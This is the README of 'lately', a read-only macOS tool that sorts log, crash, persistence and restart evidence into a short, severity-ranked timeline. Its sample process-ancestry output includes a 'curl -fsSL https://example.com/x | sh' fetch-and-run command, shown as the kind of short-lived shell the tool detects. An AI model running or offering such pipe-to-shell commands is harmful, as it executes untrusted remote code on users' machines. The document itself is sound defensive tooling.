# lately

What just happened on my Mac, and what mattered? One command, no root, no daemon, no AI.

![lately replaying sample data: stepping the window further back, the ancestry of a window that flashed open, a VPN daemon's card with its related install and developer, follow mode with new rows arriving, and the restart verdict](demo/demo.gif)

<sub>The demo replays [generic sample data](demo/sample) (`lately --replay demo/sample`), not a real Mac.</sub>

```
lately · last 15m (14:47–15:02) · tier USER · floor ≥MED   ✖ 0  ▲ 5  ● 1  ○ 0  · 2 hidden
──────────────────────────────────────────────────────────────────────────────
15:01:02  ● MED   PERSIST   Shell startup file changed: .zshrc
14:58:12  ▲ HIGH  PERMIT    com.foo.app allowed Screen Recording  NEW ≈approx
14:53:40  ▲ HIGH  CRASH     Safari crashed ×3  Apple (by name)
14:49:07  ▲ HIGH  PERSIST   Launch agent added: com.foo.updater  Developer ID ABCDE12345  NEW
──────────────────────────────────────────────────────────────────────────────
ⓘ The unified log reaches back to Oct 25 13:02 (2.1 days); older log events are gone.
ⓘ 12 field(s) were redacted by macOS as <private>.
ⓘ Commands and parents of short-lived processes need capture: sudo lately capture
ⓘ Restart causes are inferred: Apple silicon Macs log no shutdown cause code.
ⓘ Connection history needs a firewall extension such as LuLu or Little Snitch; lately net shows live connections only.
```

A terminal flashed, an app opened by itself, macOS said "Background Items Added", the Mac restarted overnight. The answers are already on the Mac, spread over the unified log, crash reports, power and boot records, install receipts and the folders software uses to start itself. Console shows all of it at 14,000 lines a minute. `lately` knows which few hundred lines matter and turns them into a short timeline:

- **Classified, not dumped.** 42 YAML rules (31 that can put a row at Low or above, 11 for context) put each event at one of five Sigma-style levels: `✖ CRIT` act now, `▲ HIGH` look at even one, `● MED` look if unexpected, `○ LOW` context, `· INFO` hidden. Persistence rules carry MITRE ATT&CK IDs. Glyphs and words always sit next to colour, and `NO_COLOR` is honoured.
- **Short by default.** It opens on the last 15 minutes at Medium and above. Apple-signed rows below Medium are hidden. Bursts are grouped into one row (`×3`). Things you have already seen are not marked NEW again.
- **An event card for every row.** Each card has the same sections: What, Who (signer, team, first seen), Why (for example the install that wrote a launch agent), Why it matters, What to do, and Raw (the file, or the exact `/usr/bin/log show` command to see it yourself).
- **"Why did my Mac restart?"** One verdict from wtmp, the panic breadcrumb, DumpPanic's boot check, shutdown-stall reports, the watchdog record, recent updates and the last power line, because Apple silicon Macs log no shutdown cause code.
- **Honest about blind spots.** Every limit is named on screen: how far back the log really goes, how many fields macOS redacted, what needs `sudo`, what is inferred, and that network history does not exist without a firewall extension.
- **Safe to paste.** `--json`, `--md` and the export are redacted: home folder, user, host names, serial number, UUIDs, IP and e-mail addresses, and URL paths become stable placeholders such as `~`, `USER`, `HOST-1` and `UUID-3`.

## Install

**Homebrew** (macOS):

```sh
brew install matthew-eucaristo/tap/lately
```

**Go** (1.26+):

```sh
go install github.com/Matthew-Eucaristo/lately@latest
```

Prebuilt archives for macOS (Apple silicon and Intel) are on the [releases page](https://github.com/Matthew-Eucaristo/lately/releases). Tested on macOS 27; the elevated tier needs `eslogger` (macOS 13 or later).

## Usage

```sh
lately                          # TUI: last 15 minutes, Medium and above
lately --since 1h               # 5m, 15m, 1h, 24h, 2d, boot, or any duration
lately --min-level info --all   # everything, including Apple and known rows
lately --list                   # plain text and exit (also the default when piped)
lately --json                   # redacted JSON (docs/contract.md); exit code says what was found
lately --md > incident.md       # redacted Markdown for an issue or a chat
lately why-restart              # the restart verdict
lately net                      # live connections and traffic, right now
lately rules                    # every rule, its level band, tier and MITRE IDs
lately --replay demo/sample     # from a clone: the demo's sample data, nothing read from this Mac
sudo lately capture             # elevated: process ancestry while it runs (see below)
lately forget                   # delete the baseline file
```

`lately why-restart` after a night the Mac restarted on its own:

```
Why did my Mac restart?   booted 03:12 today (Apple silicon)
VERDICT  ● Hung shutdown
  A shutdown or restart got stuck and macOS wrote a shutdown-stall report. An app or
  service that would not quit is the usual cause. It never finished: the hardware
  watchdog reset the Mac.
──────────────────────────────────────────────────────────────────────────────
  ✓ wtmp        boot 03:12:40 today with no shutdown record before it   → not a clean restart
  · panic       DumpPanic checked after boot and found no panic log
  ✓ watchdog    boot fault data records a watchdog reset (wdog)   → the Mac stopped responding
  ✓ stall       1 shutdown_stall report: shutdown_stall_2026-10-27-031221.shutdownStall
  · update      no macOS update installed around the restart
  ✓ power       last line 03:12:20 today: power assertion activity (the Mac was awake)   → AC, charge 64%
  ✓ last words  03:12:19 today last log entry before the gap (WindowServer)
──────────────────────────────────────────────────────────────────────────────
  No shutdown cause code: Apple silicon Macs do not log one, so this verdict is inferred from the evidence above.
```

The verdict is always exactly one of: clean restart, update restart, kernel panic, hung shutdown, or unexpected with the likely cause.

Pressing Enter on the launch agent row above opens its card:

```
WHAT     A helper will now start every time you log in: /Library/Application Support/Foo/updater
WHO      com.foo.updater · Developer ID ABCDE12345
         Developer ID Application: Foo Inc (ABCDE12345)
         first seen on this Mac
WHY      Written during the Foo install (Installer, 14:49:06)
MATTERS  Launch agents are the commonest way software, and malware, keeps running on a Mac.
         MITRE ATT&CK T1543.001
DO       Expected? press a to mark it known. Not expected? System Settings › General ›
         Login Items, or launchctl bootout gui/$(id -u)/com.foo.updater
RAW      /Library/LaunchAgents/com.foo.updater.plist
SOURCE   persist · rule persist.launch_agent v1 · confidence ✓ · first seen +1
```

The timeline shows the selected row's What, Why and Do in a pane below the list, with a strip above the rows that plots every shown finding across the window (the cursor's row is marked). Enter opens the full card. Below its sections the card draws the subject's own activity over the window and lists **related** findings, nearest first: the same process, its parent or children, the app it acted for and anything that acted on its behalf, the launch item that runs it, the install that delivered it, other events of the same app or developer, and whatever else shown happened within two minutes. Select one with `↑` `↓` and press Enter to open its card; `esc` walks back. The card suggests commands but never runs them. lately changes nothing on the system.

**Going further back.** `t` reaches one step further back (5m 15m 30m 1h 2h 3h 6h 12h 1d 2d 3d 7d) and reads only the span it adds, so going from 6h to 1d does not reread the last six hours; `T` comes back toward now without rereading anything (when the last read is over a minute old, it first reads the minutes since). Steps older than the unified log reaches (shown in the header) still add crash reports, installs and file changes. On an M4 with macOS 27: 30m 2.5 s, 1h 5.6 s (pmset joins), 3h 6.5 s, 6h 31 s.

**Following.** `f` keeps lately reading while you reproduce a problem: one `log stream` per lens, plus crash reports, installs and launch items rechecked every 5 s. New rows land at the top in green, the cursor stays on the newest row unless you move it, and a new HIGH or CRIT row is announced on the status line. `f` again pauses. Power and boot records are not followed; `r` reads everything again. Nothing is kept after you quit.

| Key | Action |
| --- | --- |
| `↑` `↓` / `j` `k`, `PgUp` `PgDn`, `g` `G` | Move |
| `⏎` | Open the card; in a card, open the selected related row (`esc` goes back one card) |
| `n` / `N` | Next / previous row at Medium or above |
| `s` / `S` | Cycle the severity floor / also show rows hidden as Apple or known |
| `t` / `T` | Reach one step further back / come one step closer to now |
| `B` / `r` | Everything since boot / read the whole window again |
| `f` | Follow: keep reading live, newest on top; `f` again pauses |
| `tab` | Group by time, category or app |
| `/` | Filter |
| `a` | Mark the subject as known (stored as a salted hash) |
| `R` | Why did my Mac restart? |
| `A` | Process ancestry for the row's process |
| `c` | Live connections and traffic |
| `e` | Redacted Markdown export: `w` saves it in the current folder, `y` copies it |
| `?` | Every limitation of this run, levels and all keys |
| `q` / `esc` | Quit / back |

| Flag | Meaning |
| --- | --- |
| `--since` | Window: `5m`, `15m` (default), `1h`, `24h`, `2d`, `boot`, or any Go duration |
| `--min-level` | Lowest level shown: `info`, `low`, `medium` (default), `high`, `critical` |
| `--all` | Also show Apple rows below Medium and rows marked known |
| `--list`, `--json`, `--md` | Print and exit |
| `--no-baseline` | Read and write no baseline; nothing is marked NEW |
| `--no-redact` | Show real names in output |
| `--capture FILE` | Also read a capture saved with `sudo lately capture --save FILE` |
| `--replay DIR` | Show saved sample events instead of this Mac (`events.ndjson`, optional `capture.ndjson`, `restart.json` and `live.ndjson`, which `f` plays as if it were happening; see [demo/sample](demo/sample)). Nothing is read from the system and the real baseline is not touched |

**Exit codes** (after [witr](https://github.com/pranshuparmar/witr)): `0` nothing at or above the floor, `1` Medium or High rows, `2` a Critical row, `3` the requested tier needs privileges, `4` usage error or every source failed. So `lately --since 1h --min-level high --list >/dev/null || say "check your Mac"` works.

## What it reads

Everything below is readable by a normal user. lately runs Apple's own tools (`/usr/bin/log`, `pmset`, `last`, `codesign`, `systemextensionsctl`, `lsof`, `nettop`, `ps`) or reads files directly, with no frameworks and no cgo.

| Evidence | Where | Answers |
| --- | --- | --- |
| Unified log, 8 narrow lenses | `/usr/bin/log show --style ndjson` with subsystem and message-template predicates: RunningBoard launches, TCC decisions, Gatekeeper scans, XProtect Remediator, Background Task Management, DumpPanic and the pre-OS log, kernel jetsam and shutdown cause, `log erase` | App launches, permission prompts answered, background items registered, malware detections, panics and watchdog resets, log erasure |
| Diagnostic reports | `.ips` headers (one JSON line) and file names in `~/Library/Logs/DiagnosticReports` and `/Library/Logs/DiagnosticReports`, plus `Retired/` | Crashes, faults, hangs, jetsam, resource reports, shutdown stalls, panic reports |
| Boot records | `kern.boottime`, `last reboot`, `last shutdown`, the DumpPanic breadcrumb | Clean or unexpected restarts |
| Power log | `pmset -g log` (windows of 1h or more) | Sleep, wake, dark wake, failures, AC or battery before a restart |
| Installs | `/Library/Receipts/InstallHistory.plist`, `/var/log/install.log`, `~/Library/Logs/Homebrew` | What got installed, and which install wrote a new background item |
| Persistence | Launch agent and daemon plists (birth and change times, program signature), crontab, shell startup files, `~/.ssh/authorized_keys`, `systemextensionsctl list` | New or changed launch items, cron entries, shell hooks, SSH keys and system extensions |
| Live network | `lsof -nP -i`, `nettop -P -L 1` | What your processes are connected to now |

### Elevated tier: `sudo lately capture`

Short-lived processes and their command lines are only visible to Endpoint Security. `sudo lately capture` starts Apple's `eslogger` as a child process for `exec`, `fork`, `exit`, background-item, TCC, Gatekeeper-override, XProtect, profile, account, authentication and sudo events, and keeps them in memory. Quitting stops it. Nothing is written unless you pass `--save FILE`, and that file holds command lines, so keep it private. Your terminal app needs Full Disk Access (System Settings › Privacy & Security). lately never installs a daemon, a login item or a system extension, and never asks for your password itself.

This is the tier that answers the flashing-window question. A shell or terminal that an `osascript`, launchd job or cron job started, and that lived under 2 seconds, becomes an `EXEC` row. `A` then shows its chain:

```
Ancestry · zsh (pid 71203) · lived 0.41 s · 15:00:31.204 → 15:00:31.615
launchd (1)   Apple
└─ helper (70001)   Dev ID ABCDE12345
   └─ osascript (70100)  osascript -e do shell script "zsh -c 'curl -fsSL https://example.com/…   Apple
      └─ zsh (71203)  zsh -c curl -fsSL https://example.com/x | sh   Apple   ◀
Source: capture since 15:00:00 · events before it are unknown
```

A parent that exited before capture started is shown as `┄ chain broken`, never guessed.

Without capture, `A` uses today's process table, which only explains processes that are still running.

## What it cannot see

lately says all of this on screen, because a tool that silently shows less is worse than one that admits it.

- **The log is short.** macOS keeps a few days at most (`log stats` overstates it). lately reads the oldest file in the log store and prints how far back it really reaches.
- **macOS redacts.** Many log fields read `<private>`. lately counts them.
- **Short-lived commands need capture.** Without `sudo lately capture` you see that Terminal was launched, not the 200 ms shell inside it.
- **Restart causes are inferred on Apple silicon.** There is no shutdown cause code, so the verdict combines the evidence above and says "inferred".
- **Permission and Gatekeeper rows are approximate (`≈`).** They come from log text Apple does not document. TCC's own events can credit the wrong process.
- **Login items inside apps are only partly visible** without sudo. The authoritative store (BTM) needs root.
- **There is no network history.** Recording which app talked to which host needs a firewall system extension such as [LuLu](https://objective-see.org/products/lulu.html) or Little Snitch. `lately net` shows live connections only.
- **Speed.** Measured on an M4 with macOS 27.0.1: 15 minutes in about 2.5 s, 1 hour in about 5–9 s (pmset alone takes about 5 s), 24 hours in about 55 s, where the RunningBoard lens is the slow part. The TUI fills in as each source finishes.

## Baseline and privacy

To mark things as NEW, lately remembers what it has seen in one file:

```
~/Library/Application Support/lately/baseline.v1.json
```

It holds only salted SHA-256 hashes and dates, with no names, paths or URLs. One side effect is that items which disappeared show up as a count, not by name. The first run builds the file and marks nothing NEW, and says so. A damaged file is never overwritten or trusted: everything counts as first seen and a warning is shown until you run `lately forget`. `--no-baseline` runs with no file at all. The footer always shows the path and size. Running under `sudo` never writes it.

lately makes no network connections, sends nothing anywhere and runs no AI. It has no background job: it runs only while you run it.

## Uninstall

```sh
lately forget                      # removes the baseline file and its folder
brew uninstall lately
brew untap matthew-eucaristo/tap   # if nothing else uses the tap
```

Exports you saved with `e` → `w` (`lately-*.md`) and capture files you saved with `--save` are yours to delete.

## Credits

Built on [Bubble Tea](https://github.com/charmbracelet/bubbletea) and [Lip Gloss](https://github.com/charmbracelet/lipgloss) (MIT), [howett.net/plist](https://github.com/DHowett/go-plist) (BSD-2-Clause) and [go.yaml.in/yaml](https://github.com/yaml/go-yaml) (MIT / Apache-2.0). Ideas, but no code, come from [Hayabusa](https://github.com/Yamato-Security/hayabusa) (severity levels and timeline columns), [witr](https://github.com/pranshuparmar/witr) (cards, broken-chain marking, exit codes), [Objective-See](https://objective-see.org) (Apple-signed filtering, first-seen baselines), [lnav](https://lnav.org) (histogram and next-row keys), Windows Reliability Monitor, and Howard Oakley's [Eclectic Light](https://eclecticlight.co) articles on the unified log and Apple silicon restarts.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). Rules live in [`internal/rules/data/rules.yaml`](internal/rules/data/rules.yaml) and can be read and tuned without touching Go. Security issues: [SECURITY.md](SECURITY.md). MIT licensed.
